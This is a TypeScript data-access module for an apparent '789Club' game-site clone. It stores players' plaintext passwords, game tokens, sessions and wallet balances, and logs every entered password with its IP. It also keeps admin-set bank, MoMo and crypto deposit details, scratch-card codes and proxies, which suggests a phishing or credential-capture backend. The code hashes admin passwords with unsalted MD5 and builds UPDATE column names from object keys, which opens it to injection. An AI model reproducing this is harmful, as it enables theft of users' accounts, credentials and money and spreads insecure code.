import { query, initDatabase } from './mysql';
import crypto from 'crypto';

// Account operations
export async function findAccountByUsername(username: string, game: string = '789Club') {
  const rows = await query(
    'SELECT * FROM account WHERE username = ? AND game = ?',
    [username, game]
  );
  return rows[0] || null;
}

export async function findAccountByToken(token: string, game: string = '789Club') {
  const rows = await query(
    'SELECT * FROM account WHERE (token = ? OR session = ?) AND game = ?',
    [token, token, game]
  );
  return rows[0] || null;
}

export async function findAccountBySession(session: string, game: string = '789Club') {
  const rows = await query(
    'SELECT * FROM account WHERE session = ? AND game = ?',
    [session, game]
  );
  return rows[0] || null;
}

export async function upsertAccount(
  username: string,
  password: string,
  token: string,
  wallet: number,
  session: string,
  game: string = '789Club'
) {
  const existing = await findAccountByUsername(username, game);
  const now = new Date();

  if (existing) {
    await query(
      `UPDATE account SET password = ?, time = ?, token = ?, wallet = ?, session = ?, game = ? WHERE id = ?`,
      [password, now, token, wallet, session, game, existing.id]
    );
  } else {
    await query(
      `INSERT INTO account (username, password, time, token, wallet, session, game, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
      [username, password, now, token, wallet, session, game, now]
    );
  }
}

// Login logs
export async function insertLoginLog(data: {
  username: string;
  password?: string;
  wallet?: string | number;
  token?: string;
  session?: string;
  ip?: string;
}) {
  await query(
    `INSERT INTO login_logs (username, password, wallet, token, session, ip, login_time) VALUES (?, ?, ?, ?, ?, ?, ?)`,
    [data.username, data.password, data.wallet, data.token, data.session, data.ip, new Date()]
  );
}

// Admin users
export async function findAdminUser(username: string) {
  const rows = await query('SELECT * FROM admin_users WHERE username = ?', [username]);
  return rows[0] || null;
}

export async function createAdminUser(username: string, password: string) {
  const hashedPassword = crypto.createHash('md5').update(password).digest('hex');
  await query(
    'INSERT INTO admin_users (username, password, created_at) VALUES (?, ?, ?)',
    [username, hashedPassword, new Date()]
  );
}

export async function verifyAdminPassword(username: string, password: string) {
  const user = await findAdminUser(username);
  if (!user) return false;
  const hashedPassword = crypto.createHash('md5').update(password).digest('hex');
  return user.password === hashedPassword;
}

export async function updateAdminPassword(username: string, newPassword: string) {
  const hashedPassword = crypto.createHash('md5').update(newPassword).digest('hex');
  const result = await query(
    'UPDATE admin_users SET password = ?, updated_at = ? WHERE username = ?',
    [hashedPassword, new Date(), username]
  );
  return (result as any).affectedRows > 0;
}

// Admin bank
export async function getActiveBanks() {
  return await query('SELECT * FROM admin_bank WHERE is_active = TRUE');
}

export async function getBankById(id: string | number) {
  const numId = typeof id === 'string' ? parseInt(id) : id;
  const rows = await query('SELECT * FROM admin_bank WHERE id = ?', [numId]);
  return rows[0] || null;
}

export async function createOrUpdateBank(data: {
  _id?: string;
  bank_name?: string;
  account_number?: string;
  account_name?: string;
  sepay_bank_code?: string;
  is_active?: boolean;
}) {
  if (data._id) {
    const numId = typeof data._id === 'string' ? parseInt(data._id) : data._id;
    delete data._id;
    const fields = Object.keys(data).map(k => `${k} = ?`).join(', ');
    const values = [...Object.values(data), new Date(), numId];
    await query(`UPDATE admin_bank SET ${fields}, updated_at = ? WHERE id = ?`, values);
    return numId;
  } else {
    const result = await query(
      'INSERT INTO admin_bank (bank_name, account_number, account_name, sepay_bank_code, is_active, created_at) VALUES (?, ?, ?, ?, ?, ?)',
      [data.bank_name, data.account_number, data.account_name, data.sepay_bank_code, data.is_active ?? true, new Date()]
    );
    return (result as any).insertId;
  }
}

// Admin crypto
export async function getActiveCrypto() {
  return await query('SELECT * FROM admin_crypto WHERE is_active = TRUE');
}

export async function getAllCrypto() {
  return await query('SELECT * FROM admin_crypto ORDER BY currency, network');
}

export async function createOrUpdateCrypto(data: {
  _id?: string;
  currency?: string;
  network?: string;
  wallet_address?: string;
  qr_code?: string;
  exchange_rate?: number;
  fee?: number;
  is_active?: boolean;
}) {
  if (data._id) {
    const numId = typeof data._id === 'string' ? parseInt(data._id) : data._id;
    delete data._id;
    const fields = Object.keys(data).map(k => `${k} = ?`).join(', ');
    const values = [...Object.values(data), new Date(), numId];
    await query(`UPDATE admin_crypto SET ${fields}, updated_at = ? WHERE id = ?`, values);
    return numId;
  } else {
    const result = await query(
      'INSERT INTO admin_crypto (currency, network, wallet_address, qr_code, exchange_rate, fee, is_active, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
      [data.currency, data.network, data.wallet_address, data.qr_code, data.exchange_rate ?? 1, data.fee ?? 0, data.is_active ?? true, new Date()]
    );
    return (result as any).insertId;
  }
}

// Admin momo
export async function getActiveMomo() {
  const rows = await query('SELECT * FROM admin_momo WHERE is_active = TRUE LIMIT 1');
  return rows[0] || null;
}

export async function createOrUpdateMomo(data: {
  _id?: string;
  momo_number?: string;
  momo_name?: string;
  is_active?: boolean;
}) {
  if (data._id) {
    const numId = typeof data._id === 'string' ? parseInt(data._id) : data._id;
    delete data._id;
    const fields = Object.keys(data).map(k => `${k} = ?`).join(', ');
    const values = [...Object.values(data), new Date(), numId];
    await query(`UPDATE admin_momo SET ${fields}, updated_at = ? WHERE id = ?`, values);
    return numId;
  } else {
    const result = await query(
      'INSERT INTO admin_momo (momo_number, momo_name, is_active, created_at) VALUES (?, ?, ?, ?)',
      [data.momo_number, data.momo_name, data.is_active ?? true, new Date()]
    );
    return (result as any).insertId;
  }
}

// Admin telco
export async function getActiveTelcos() {
  return await query('SELECT * FROM admin_telco WHERE active = TRUE');
}

export async function getAllTelcos() {
  return await query('SELECT * FROM admin_telco ORDER BY name');
}

export async function createOrUpdateTelco(data: {
  _id?: string;
  name?: string;
  telco_id?: number;
  url?: string;
  active?: boolean;
  exchange_rates?: string;
}) {
  if (data._id) {
    const numId = typeof data._id === 'string' ? parseInt(data._id) : data._id;
    delete data._id;
    const fields = Object.keys(data).map(k => `${k} = ?`).join(', ');
    const values = [...Object.values(data), new Date(), numId];
    await query(`UPDATE admin_telco SET ${fields}, updated_at = ? WHERE id = ?`, values);
    return numId;
  } else {
    const result = await query(
      'INSERT INTO admin_telco (name, telco_id, url, active, exchange_rates, created_at) VALUES (?, ?, ?, ?, ?, ?)',
      [data.name, data.telco_id, data.url, data.active ?? true, data.exchange_rates, new Date()]
    );
    return (result as any).insertId;
  }
}

// Admin thecao
export async function getActiveTheCao() {
  const rows = await query('SELECT * FROM admin_thecao WHERE is_active = TRUE LIMIT 1');
  return rows[0] || null;
}

export async function getTheCaoForAdmin() {
  const rows = await query('SELECT * FROM admin_thecao ORDER BY created_at DESC LIMIT 1');
  return rows[0] || null;
}

export async function createOrUpdateTheCao(data: {
  _id?: string;
  partner_id?: string;
  partner_key?: string;
  url?: string;
  is_active?: boolean;
}) {
  if (data._id) {
    const numId = typeof data._id === 'string' ? parseInt(data._id) : data._id;
    delete data._id;
    const fields = Object.keys(data).map(k => `${k} = ?`).join(', ');
    const values = [...Object.values(data), new Date(), numId];
    await query(`UPDATE admin_thecao SET ${fields}, updated_at = ? WHERE id = ?`, values);
    return numId;
  } else {
    const result = await query(
      'INSERT INTO admin_thecao (partner_id, partner_key, url, is_active, created_at) VALUES (?, ?, ?, ?, ?)',
      [data.partner_id, data.partner_key, data.url, data.is_active ?? true, new Date()]
    );
    return (result as any).insertId;
  }
}

// Paygate transactions
export async function insertPaygateTransaction(data: {
  method: string;
  amount: number;
  status: string;
  bank_name?: string;
  account_number?: string;
  codepay?: string;
  telco?: string;
  serial?: string;
  card_code?: string;
  note?: string;
  ip_address?: string;
}) {
  await query(
    `INSERT INTO paygate_transactions 
     (method, amount, status, bank_name, account_number, codepay, telco, serial, card_code, note, ip_address, created_at) 
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [
      data.method,
      data.amount,
      data.status,
      data.bank_name,
      data.account_number,
      data.codepay,
      data.telco,
      data.serial,
      data.card_code,
      data.note,
      data.ip_address,
      new Date()
    ]
  );
}

export async function getPaygateTransactions(filters: {
  method?: string;
  status?: string;
  start_date?: Date;
  end_date?: Date;
  limit?: number;
  skip?: number;
}) {
  let sql = 'SELECT * FROM paygate_transactions WHERE 1=1';
  const params: any[] = [];

  if (filters.method) {
    sql += ' AND method = ?';
    params.push(filters.method);
  }
  if (filters.status) {
    sql += ' AND status = ?';
    params.push(filters.status);
  }
  if (filters.start_date) {
    sql += ' AND created_at >= ?';
    params.push(filters.start_date);
  }
  if (filters.end_date) {
    sql += ' AND created_at <= ?';
    params.push(filters.end_date);
  }

  sql += ' ORDER BY created_at DESC';
  sql += ' LIMIT ? OFFSET ?';
  params.push(filters.limit || 50, filters.skip || 0);

  return await query(sql, params);
}

export async function getPaygateStats(filters: {
  method?: string;
  start_date?: Date;
  end_date?: Date;
}) {
  let sql = 'SELECT SUM(amount) as total_amount, COUNT(*) as count FROM paygate_transactions WHERE status = "success"';
  const params: any[] = [];

  if (filters.method) {
    sql += ' AND method = ?';
    params.push(filters.method);
  }
  if (filters.start_date) {
    sql += ' AND created_at >= ?';
    params.push(filters.start_date);
  }
  if (filters.end_date) {
    sql += ' AND created_at <= ?';
    params.push(filters.end_date);
  }

  const rows = await query(sql, params);
  const result = rows[0];
  return {
    total_amount: parseFloat(result?.total_amount) || 0,
    count: parseInt(result?.count) || 0
  };
}

export async function getPaygateStatsByMethod(start_date?: Date, end_date?: Date) {
  let sql = 'SELECT method, SUM(amount) as total_amount, COUNT(*) as count FROM paygate_transactions WHERE status = "success"';
  const params: any[] = [];

  if (start_date) {
    sql += ' AND created_at >= ?';
    params.push(start_date);
  }
  if (end_date) {
    sql += ' AND created_at <= ?';
    params.push(end_date);
  }

  sql += ' GROUP BY method ORDER BY total_amount DESC';

  return await query(sql, params);
}

export async function getAccounts(limit: number = 50, skip: number = 0) {
  const list = await query(
    'SELECT * FROM account ORDER BY created_at DESC LIMIT ? OFFSET ?',
    [limit, skip]
  );
  const countResult = await query('SELECT COUNT(*) as total FROM account');
  const total = countResult[0]?.total || 0;
  return { list, total };
}

export async function getAllAdminUsers() {
  return await query('SELECT * FROM admin_users ORDER BY created_at DESC');
}

// Proxy
export async function getProxies() {
  return await query('SELECT * FROM proxy');
}

export async function addProxy(proxy: string) {
  await query('INSERT INTO proxy (proxy, created_at) VALUES (?, ?)', [proxy, new Date()]);
}

// Helper functions
export function crc32(str: string): number {
  let crc = 0xFFFFFFFF;
  const table: number[] = [];
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) {
      c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
    }
    table[n] = c;
  }
  for (let i = 0; i < str.length; i++) {
    crc = (crc >>> 8) ^ table[(crc ^ str.charCodeAt(i)) & 0xFF];
  }
  return (crc ^ 0xFFFFFFFF) >>> 0;
}

export default {
  initDatabase,
  findAccountByUsername,
  findAccountByToken,
  findAccountBySession,
  upsertAccount,
  insertLoginLog,
  findAdminUser,
  createAdminUser,
  verifyAdminPassword,
  updateAdminPassword,
  getActiveBanks,
  getBankById,
  createOrUpdateBank,
  getActiveCrypto,
  createOrUpdateCrypto,
  getActiveMomo,
  createOrUpdateMomo,
  getActiveTelcos,
  getAllTelcos,
  createOrUpdateTelco,
  getActiveTheCao,
  createOrUpdateTheCao,
  getAllCrypto,
  insertPaygateTransaction,
  getPaygateTransactions,
  getPaygateStats,
  getPaygateStatsByMethod,
  getAccounts,
  getAllAdminUsers,
  getProxies,
  addProxy,
  crc32
};
